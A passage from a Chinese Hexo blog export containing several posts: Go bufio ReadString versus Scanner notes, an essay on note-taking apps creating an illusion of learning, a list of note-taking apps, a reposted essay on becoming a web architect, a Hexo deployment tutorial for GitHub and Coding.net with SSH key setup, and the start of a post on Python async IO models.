class="title">returning</span> <span class="title">a</span> <span class="title">string</span> <span class="title">containing</span> <span class="title">the</span> <span class="title">data</span> <span class="title">up</span> <span class="title">to</span> <span class="title">and</span> <span class="title">including</span> <span class="title">the</span> <span class="title">delimiter</span>. <span class="title">If</span> <span class="title">ReadString</span> <span class="title">encounters</span> <span class="title">an</span> <span class="title">error</span> <span class="title">before</span> <span class="title">finding</span> <span class="title">a</span> <span class="title">delimiter</span>, <span class="title">it</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">data</span> <span class="title">read</span> <span class="title">before</span> <span class="title">the</span> <span class="title">error</span> <span class="title">and</span> <span class="title">the</span> <span class="title">error</span> <span class="title">itself</span> <span class="params">(often io.EOF)</span>. <span class="title">ReadString</span> <span class="title">returns</span> <span class="title">err</span> != <span class="title">nil</span> <span class="title">if</span> <span class="title">and</span> <span class="title">only</span> <span class="title">if</span> <span class="title">the</span> <span class="title">returned</span> <span class="title">data</span> <span class="title">does</span> <span class="title">not</span> <span class="title">end</span> <span class="title">in</span> <span class="title">delim</span>. <span class="title">For</span> <span class="title">simple</span> <span class="title">uses</span>, <span class="title">a</span> <span class="title">Scanner</span> <span class="title">may</span> <span class="title">be</span> <span class="title">more</span> <span class="title">convenient</span>. </span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">NewScanner</span><span class="params">(r io.Reader)</span> *<span class="title">Scanner</span></span></span><br><span class="line"><span class="function">//<span class="title">NewScanner</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">read</span> <span class="title">from</span> <span class="title">r</span>. <span class="title">The</span> <span class="title">split</span> <span class="title">function</span> <span class="title">defaults</span> <span class="title">to</span> <span class="title">ScanLines</span>. </span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Scan</span><span class="params">()</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function">//<span class="title">Scan</span> <span class="title">advances</span> <span class="title">the</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">the</span> <span class="title">next</span> <span class="title">token</span>, <span class="title">which</span> <span class="title">will</span> <span class="title">then</span> <span class="title">be</span> <span class="title">available</span> <span class="title">through</span> <span class="title">the</span> <span class="title">Bytes</span> <span class="title">or</span> <span class="title">Text</span> <span class="title">method</span>. <span class="title">It</span> <span class="title">returns</span> <span class="title">false</span> <span class="title">when</span> <span class="title">the</span> <span class="title">scan</span> <span class="title">stops</span>, <span class="title">either</span> <span class="title">by</span> <span class="title">reaching</span> <span class="title">the</span> <span class="title">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">input</span> <span class="title">or</span> <span class="title">an</span> <span class="title">error</span>. <span class="title">After</span> <span class="title">Scan</span> <span class="title">returns</span> <span class="title">false</span>, <span class="title">the</span> <span class="title">Err</span> <span class="title">method</span> <span class="title">will</span> <span class="title">return</span> <span class="title">any</span> <span class="title">error</span> <span class="title">that</span> <span class="title">occurred</span> <span class="title">during</span> <span class="title">scanning</span>, <span class="title">except</span> <span class="title">that</span> <span class="title">if</span> <span class="title">it</span> <span class="title">was</span> <span class="title">io</span>.<span class="title">EOF</span>, <span class="title">Err</span> <span class="title">will</span> <span class="title">return</span> <span class="title">nil</span>. <span class="title">Scan</span> <span class="title">panics</span> <span class="title">if</span> <span class="title">the</span> <span class="title">split</span> <span class="title">function</span> <span class="title">returns</span> 100 <span class="title">empty</span> <span class="title">tokens</span> <span class="title">without</span> <span class="title">advancing</span> <span class="title">the</span> <span class="title">input</span>. <span class="title">This</span> <span class="title">is</span> <span class="title">a</span> <span class="title">common</span> <span class="title">error</span> <span class="title">mode</span> <span class="title">for</span> <span class="title">scanners</span>. </span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">//<span class="title">Text</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">most</span> <span class="title">recent</span> <span class="title">token</span> <span class="title">generated</span> <span class="title">by</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">Scan</span> <span class="title">as</span> <span class="title">a</span> <span class="title">newly</span> <span class="title">allocated</span> <span class="title">string</span> <span class="title">holding</span> <span class="title">its</span> <span class="title">bytes</span>.</span></span><br></pre></td></tr></table></figure></p>
<p>按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符<br>虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西</p>
<p><em>转载请注明出处</em></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>笔记带给我们是真实的知识增长么？你需要好好考虑了</title>
    <url>/2017/01/21/%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html</url>
    <content><![CDATA[<p>我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。<br><a id="more"></a><br>其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…”</p>
<p>那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。</p>
<p>当时我下意识地反问了一句：“那谁不会啊？”</p>
<p>说完我自己都惊了一下。</p>
<p>那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。</p>
<p>在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。</p>
<p>《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。</p>
<p><strong>转自<a href="https://www.v2ex.com/amp/t/191507" target="_blank" rel="noopener">V2EX</a>一位v友的回答</strong></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>PKM（个人知识管理）类软件收集(偶尔更新列表)</title>
    <url>/2017/01/21/PKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html</url>
    <content><![CDATA[<p>evernote(印象笔记)</p>
<p>Wiz<br><a id="more"></a><br>有道云</p>
<p>麦库</p>
<p>leanote</p>
<p>GoogleKeep</p>
<p>OneNote</p>
<p>SimpleNote(wp家的，免费)</p>
<p>pocket(稍后读的软件，同类的还有Instapaper，国内的收趣)</p>
<p>MyBase</p>
<p>RaysNote(v友开发)</p>
<p>CintaNotes</p>
<p><a href="https://jitaku.io" target="_blank" rel="noopener">https://jitaku.io</a></p>
<p><strong>开源</strong></p>
<p>Gitit-Bigger</p>
<p>Laverna</p>
<p>paperwork</p>
<p>DokuWiki</p>
<p>leanote</p>
<p>PermaNote</p>
<p>CherryTree</p>
<p>BrainStorm</p>
]]></content>
      <categories>
        <category>推荐向</category>
      </categories>
      <tags>
        <tag>推荐向</tag>
        <tag>软件</tag>
      </tags>
  </entry>
  <entry>
    <title>web高级开发的成长之路</title>
    <url>/2017/01/20/web%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html</url>
    <content><![CDATA[<p>读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。</p>
<p><strong>正文如下：</strong><br><a id="more"></a><br>本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？</p>
<p>　　一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。</p>
<p>　　二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了……</p>
<p>　　三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。</p>
<p>　　四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。</p>
<p>　　有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。</p>
<p>　　如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。</p>
<p>　　写代码要经历下面几个阶段。</p>
<p>　　一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！</p>
<p>　　很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？</p>
<p>　　面向对象的目的是什么？</p>
<p>　　开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是：</p>
<p>　　1. 降低软件开发的复杂度</p>
<p>　　2. 提高软件开发的效率</p>
<p>　　3. 提高软件质量：可维护性，可扩展性，可重用性等。</p>
<p>　　其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。</p>
<p>　　提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。</p>
<p>　　二、 要想学好面向对象，就必须学习设计模式。</p>
<p>　　假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。</p>
<p>　　因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。</p>
<p>　　因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。</p>
<p>　　三、学习设计模式</p>
<p>　　正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。</p>
<p>　　当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。</p>
<p>　　当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。</p>
<p>　　四、学习重构</p>
<p>　　精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？</p>
<p>　　Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。</p>
<p>　　在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。</p>
<p>　　总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。</p>
<p>　　《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。</p>
<p>　　五、开始通往优秀软件设计师的路上</p>
<p>　　通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。</p>
<p>　　这本书正是我们需要的教练，值得一读。</p>
<p>　　六、没有终点，只有坚持不懈的专研和努力。</p>
<p>　　经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。</p>
<p>　　正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。</p>
<p><strong>转自<a href="http://www.cnblogs.com/leefan/p/5489984.html" target="_blank" rel="noopener">李凡的博客</a></strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo在github和coding.net部署并分流（一）</title>
    <url>/2017/01/10/hexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89-1.html</url>
    <content><![CDATA[<h1 id="安装GIT和Node-JS"><a href="#安装GIT和Node-JS" class="headerlink" title="安装GIT和Node.JS"></a>安装GIT和Node.JS</h1><p>首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">git config --global user.email <span class="string">"email@example.com"</span></span><br></pre></td></tr></table></figure></p>
<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。<br><strong>注意：</strong>git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<a id="more"></a>
<p>#安装并初始化HEXO<br>如果你是在Windows上，请打开Git-CMD<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/git-cmd-exa.png" alt="1"><br>假如你是想在D:\blog\下建立你的博客，请先在D盘下新建文件夹blog<br>在Git-CMD中输入<code>npm install -g hexo-cli</code>回车开始安装hexo<br>安装完成后将git cmd工作目录切换至D:\blog\然后输入<code>hexo init</code>回车，或者直接在git cmd中输入<code>hexo init d:\\blog</code><br>如果你的d:\blog\下的目录形式是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。</span><br><span class="line">├── package.json </span><br><span class="line">├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。</span><br><span class="line">├── source // 存放用户资源的地方</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。</span><br></pre></td></tr></table></figure></p>
<p>那么你的hexo安装并初始化完成<br>然后输入<code>hexo server</code>启动本地demo，打开浏览器，查看<a href="http://localhost:4000/可以看到自己的博客" target="_blank" rel="noopener">http://localhost:4000/可以看到自己的博客</a></p>
<h1 id="将之托管到github和coding上"><a href="#将之托管到github和coding上" class="headerlink" title="将之托管到github和coding上"></a>将之托管到github和coding上</h1><h2 id="github项目创建"><a href="#github项目创建" class="headerlink" title="github项目创建"></a>github项目创建</h2><p>1.注册github账号<br>2.创建项目仓库<br>进入<a href="https://github.com/" target="_blank" rel="noopener">github.com</a>，然后点击右上角 + –&gt;new repository</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/new%20rep.png" alt="2"></p>
<p>3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-github-1.png" alt="3"></p>
<h2 id="Coding项目创建"><a href="#Coding项目创建" class="headerlink" title="Coding项目创建"></a>Coding项目创建</h2><p>1.注册Coding账号<br>2.创建项目仓库</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-1.png" alt="4"></p>
<p>3.填写项目名称描述创建即可</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-2.png" alt="5"></p>
<h2 id="配置SHH"><a href="#配置SHH" class="headerlink" title="配置SHH"></a>配置SHH</h2><p>配置shh key是让本地git项目与远程的github建立联系<br>1.检查是否已经有SSH Key，打开Git Bash，输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure></p>
<p>2.如果没有.ssh这个目录，则生成一个新的SSH，输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"your e-mail"</span></span><br></pre></td></tr></table></figure></p>
<p>注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」<br>接下来几步都直接按回车键,然后系统会要你输入密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):&lt;输入加密串&gt;</span><br><span class="line">Enter same passphrase again:&lt;再次输入加密串&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便<br>注意：输入密码的时候没有*字样的，你直接输入就可以了。<br>3.最后看到这样的界面，就成功设置ssh key了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/wangzhanssh%20key.jpg" alt="6"></p>
<h2 id="添加-SSH-Key-到-GitHub和Coding"><a href="#添加-SSH-Key-到-GitHub和Coding" class="headerlink" title="添加 SSH Key 到 GitHub和Coding"></a>添加 SSH Key 到 GitHub和Coding</h2><p>复制<code>~/.ssh/id_rsa.pub</code>中的内容<br>~是个人文件夹，比如我的电脑上是C:\Users\Administrator.ssh\id_rsa.pub，将其中的文本复制<br>进入github，点击头像–&gt;Setting–&gt;SSH and GPG keys,然后在右侧点击New SSH key，<br>Title随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了<br>进入Coding.net，点击头像–&gt;个人设置–&gt;SSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok</p>
<h2 id="测试SSH是否配置成功"><a href="#测试SSH是否配置成功" class="headerlink" title="测试SSH是否配置成功"></a>测试SSH是否配置成功</h2><p>1.打开Git Bash，然后输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></p>
<p>如配置了密码则要输入密码,输完按回车<br>如果显示以下内容，则说明Github中的ssh配置成功。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hi username! You<span class="string">'ve successfully authenticated, but GitHub does not</span></span><br><span class="line"><span class="string">provide shell access.</span></span><br></pre></td></tr></table></figure></p>
<p>2.再输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@git.coding.net</span><br></pre></td></tr></table></figure></p>
<p>如果显示以下则说明coding中的ssh配置成功<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello username You<span class="string">'ve connected to Coding.net by SSH successfully!</span></span><br></pre></td></tr></table></figure></p>
<h2 id="创建Github-Pages和Coding-Pages-服务"><a href="#创建Github-Pages和Coding-Pages-服务" class="headerlink" title="创建Github Pages和Coding Pages 服务"></a>创建Github Pages和Coding Pages 服务</h2><p>1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。<br>Coding Pages服务开启在官网说的很详细，不知道请百度<br>2.打开D:\blog文件夹中的_config.yml文件，找到如下位置，填写<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">- <span class="built_in">type</span>: git</span><br><span class="line">  repo: </span><br><span class="line">    github: git@github.com:yourname/yourname.github.io.git,master</span><br><span class="line">    coding: git@git.coding.net:yourname/yourname.git,coding-pages</span><br></pre></td></tr></table></figure></p>
<p><strong>注：</strong> (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。</p>
<p>#部署完成<br>在blog文件夹中空白处右击打开Git Bash输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo d- g</span><br></pre></td></tr></table></figure></p>
<p>此时，通过访问<a href="http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。" target="_blank" rel="noopener">http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Python异步爬虫的学习(一)</title>
    <url>/2016/12/11/Python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0(%E4%B8%80).html</url>
    <content><![CDATA[<hr>
<p>本文主要从一下几个方面进行说明:</p>
<ul>
<li>什么是<a href="http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B" target="_blank" rel="noopener">异步(Asynchronous)编程</a></li>
<li>为什么要使用异步编程？</li>
<li>如何利用Python实现异步</li>
</ul>
<hr>
<a id="more"></a>
<h1 id="什么是异步编程"><a href="#什么是异步编程" class="headerlink" title="什么是异步编程"></a>什么是异步编程</h1><h2 id="文章开始前，先简单介绍下各种-IO-模型："><a href="#文章开始前，先简单介绍下各种-IO-模型：" class="headerlink" title="文章开始前，先简单介绍下各种 IO 模型："></a>文章开始前，先简单介绍下各种 IO 模型：</h2><h3 id="最容易做的是阻塞-IO"><a href="#最容易做的是阻塞-IO" class="headerlink" title="最容易做的是阻塞 IO"></a>最容易做的是阻塞 IO</h3><p>即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。</p>
<h3 id="接着是非阻塞-IO"><a href="#接着是非阻塞-IO" class="headerlink" title="接着是非阻塞 IO"></a>接着是非阻塞 IO</h3><p>即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。</p>
<h3 id="然后是-IO-复用"><a href="#然后是-IO-复用" class="headerlink" title="然后是 IO 复用"></a>然后是 IO 复用</h3><p>即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。</p>
<h3 id="再之后是信号驱动"><a href="#再之后是信号驱动" class="headerlink" title="再之后是信号驱动"></a>再之后是信号驱动</h3><p>即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。</p>
<h3 id="最后是异步-IO"><a href="#最后是异步-IO" class="headerlink" title="最后是异步 IO"></a>最后是异步 IO</h3><p>即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。<br>虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。</p>
<h2 id="然后我们了解一下事件循环-Event-Loop"><a href="#然后我们了解一下事件循环-Event-Loop" class="headerlink" title="然后我们了解一下事件循环(Event Loop)"></a>然后我们了解一下事件循环(Event Loop)</h2><p>Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。</p>
<p><img src="http://image.beekka.com/blog/201310/2013102001.png" alt="Event Loop"></p>
<p>我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。</p>
<p>如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。</p>
<p>那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。</p>
